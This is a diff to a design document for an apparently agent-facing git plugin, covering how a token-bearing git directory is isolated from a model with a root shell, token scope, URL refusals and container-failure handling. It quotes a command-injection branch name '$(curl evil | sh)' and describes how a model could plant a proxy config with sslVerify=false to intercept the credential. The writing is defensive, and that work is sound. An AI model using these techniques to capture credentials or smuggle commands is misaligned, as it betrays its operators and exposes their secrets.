@@ -57,13 +57,33 @@ The same mechanism carries every **model-authored** value — URLs, branch names
 commit messages — as an environment variable rather than interpolating it into a
 command, so a branch name of `$(curl evil | sh)` is inert text.
 
-What remains is not zero. The model has a root shell in the same filesystem, so
-it can still race a write against the isolated dir between the command that
-creates it and the command that uses it. What the arrangement above removes is
-the durable form of that attack — plant once, collect on every future push — and
-what is left has to win a race inside a single turn. Removing the rest means not
-doing authenticated git in the container at all, i.e. pushing from the Worker
-over the forge's API.
+The isolated dir is built, configured and used in **one** command, not three.
+That matters because the model has a root shell on the same filesystem: with the
+steps split, there was a gap in which a `config` could be planted in the dir, and
+a URL-specific `http.<url>.proxy` with `sslVerify=false` in a repository's own
+config beats a `-c` override — the very reason the dir exists. So the
+credentialed command writes the dir's entire configuration itself, immediately
+before git reads it, rather than trusting what it finds.
+
+A refresh is the one operation that cannot collapse all the way, and the reason
+is the same rule: seeding the dir means reading the checkout's refs, which is a
+`git` command **inside the checkout**, and that is exactly where the token must
+never be. So the seed runs on its own with no credential, and the fetch that
+follows re-asserts the dir's configuration before using it.
+
+What remains is not zero, and it is worth naming precisely:
+
+- An attacker would now have to win a race _inside_ a single command, against a
+  path named from the Worker that it has to discover first. Removing even that
+  means not doing authenticated git in the container at all, i.e. pushing from
+  the Worker over the forge's API.
+- **The token's reach is the token's own.** This plugin checks the _host_ a clone
+  or push may target, never the repository — so whatever the credential can read
+  or write, an agent that is talked into naming it can reach. That is deliberate:
+  a repository allowlist here would block legitimate work like filing a pull
+  request against a dependency. It does mean the `GITHUB_TOKEN` should be
+  fine-grained and scoped to what the agent is actually for, because nothing
+  below it will narrow it further.
 
 ## Guardrails are in the tool, not the prompt
 
@@ -93,6 +113,31 @@ went back to the default branch and reset — and `checkout -B` force-moved
 with the checkout still in it. It fetches and resets a clean one, and **refuses a
 dirty one** rather than resetting over the top: those changes are a previous
 task's work, and discarding them is the one outcome nobody can undo.
+
+It also refuses a URL that names no repository — `.../tree/main`, `.../pull/4`,
+what a model copies out of a browser. That used to clone into `/workspace/repo`
+without firing `beforeCheckout`, so a host keying its filesystem per repository
+never switched and the checkout landed in whichever one was already open. The
+refusal says what to send instead, which costs a turn and no guessing.
+
+## When the container is not there
+
+`exec` does not only return failures, it throws them: `@cloudflare/computer`
+throws when a container is replaced mid-command, and a Durable Object call can
+fail outright. None of that reaches the model as a tool error — it is caught
+where the command is run and comes back through each tool's own failure
+sentence, so `repo_status` says it could not read the status and `repo_push`
+says the push did not go, each carrying what a replaced container actually
+means: nothing finished, the checkout is durable and untouched, and retrying is
+safe because these commands push one specific commit and never force.
+
+The distinction that costs something if you get it wrong is between a command
+that **answered no** and one that **never ran**. Three places here read a failure
+as an answer — "no checkout in this directory", "no such branch", "no default
+branch to protect" — and a container that vanished must not be read as any of
+them. A replaced container is exactly the case where the next command lands on a
+working replacement, so a probe misread as "empty directory" would send `git
+clone` at a checkout that is already there.
 
 ## Output is bounded
 
